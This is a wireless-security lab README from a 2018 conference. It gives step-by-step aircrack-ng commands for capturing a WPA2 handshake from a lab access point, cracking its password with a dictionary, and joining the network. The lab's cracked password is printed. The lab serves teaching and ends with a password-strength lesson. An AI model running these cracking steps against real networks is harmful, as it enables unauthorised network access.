# RSSC2018-Wireless-Lab

## Prerequisites

In order to execute this lab, there are a few things you will need to get started:
1. An access point broadcasting an SSID with a WPA2 password.
2. Kali Linux installed to attack the target host from.
3. A wireless card compatible with Kali Linux to scan/monitor wireless networks in your vicinity. 

## Air Monitor
You will walk through the process of monitoring wireless networks and capturing a WPA2 handshake. You will need one Terminal window open to execute the following steps.

1. In your terminal, execute the iwconfig command to show any wireless cards in the computer. 
```bash
iwconfig
```
The operating system recognizes a wireless interface named wlan0.

2. Enable the wireless interface.
```bash
ifconfig wlan0 up
```

3. Force the wireless card to scan and report on all wireless networks in the area. The SSID you are trying to target for this lab is named ‘RSSC’. You will need the MAC address and the channel that this AP is transmitting on.
```bash
iwlist wlan0 scanning | grep -B 5 'RSSC'
```
* grep 'RSSC' prints lines matching the pattern 'RSSC'
* grep -B 5 'RSSC' prints out lines matching the pattern 'RSSC' and the 5 lines before the match.

Next, you need to change the wireless card to monitoring mode. You do this by creating a monitor interface using airmon-ng. 

4. Verify airmon-ng sees your wireless card.
```bash
airmon-ng 
```

5. Change the wireless card to monitoring mode. This will allow the wireless card to examine all the packets in the air.
```bash
airmon-ng start wlan0
```
More information on the commands used, or other information about airmon-ng can be found by running `man airmon-ng`.  

6. Run the ifconfig command to verify the monitor interface is created. 
```bash
ifconfig 
```
You can see wlan0mon was created.

7. Use airodump-ng to capture the WPA2 handshake. You will have to catch someone in the act of authenticating to get a valid capture. We have a script running that acts as someone authenticating to the network and generating that WPA2 handshake. 
```bash
airodump-ng wlan0mon –-bssid <mac-address> --channel <channel> –-write <filename>
``` 
Note: Replace the 'mac-address' and 'channel' with what you found in step 3 and give it a filename. MAC address will need to use numbers, colons, and all caps. See below for correct command:
```bash
airodump-ng wlan0mon --bssid 00:30:44:27:E3:38 --channel 1 --write rssc
```
airodump-ng will display a valid handshake when it captures it. It will display the handshake confirmation in the upper right-hand corner of the terminal window. We want a to get a few of these handshakes in our capture. Run this command for 15 seconds and then break out of it using ‘ctrl + c’. An 'ls' after you break out should display 'rssc-*.cap' file that we will use in the next step.
  
More information on the commands used, or other information about airodump-ng can be found by running `man airodump-ng`. 

## Password Cracking
8. We will use aircrack-ng with the dictionary file to crack the password. 
```bash
aircrack-ng rssc-01.cap -a 2 -w dictionary.txt
```
* -a forces the attack mode. The '2' following -a is for WPA-PSK. A '1' is used for WEP.
* -w is the path to the dictionary file used for WPA cracking. In this case, 'dictionary.txt' is sitting in our home directory.

After a few seconds, it should find the password needed to get onto the 'RSSC' network. It is 'Drowssap2'.

More information on the commands used, or other information about aircrack-ng can be found by running `man aircrack-ng`. 

## Connecting to Wireless Network

Now that you have the WPA2 password, you can get onto the 'RSSC' network.

9. Before we can use the wireless card, we need to take it out of monitoring mode. 
```bash
airmon-ng stop wlan0mon
```

10. Back on the Kali Linux desktop, select the icon at the bottom of the sidebar titled 'Show Applications'. Use the 'Type to search' box to search 'Settings' and open it. Select Wi-Fi and find 'RSSC' under 'Visible Networks'. Select it and type in the password (Drowssap2) to connect to the network.

11. Back in terminal, type:
```bash
ping 192.168.0.1
```
This IP address is the AP/Router that is broadcasting this SSID. If you are able to ping it successfully, you have gotten onto the network. If not, make sure you are connected to the 'RSSC' network and try again.

## Clean-up
12. Run the following command to run a script to delete all the files you created and reset the network settings:
```bash
./cleanup.sh
```

## Conclusion
We hope that this lab shed some light on how easily an attacker is able to crack a short, non-unique password. The longer and more complex the password is, the longer it is going to take to be cracked. This time exponentially increases with each character that is added, especially if it has special, uppercase, and lowercase characters and numbers.
See the below link on some of the math involved in this:
https://www.grc.com/haystack.htm
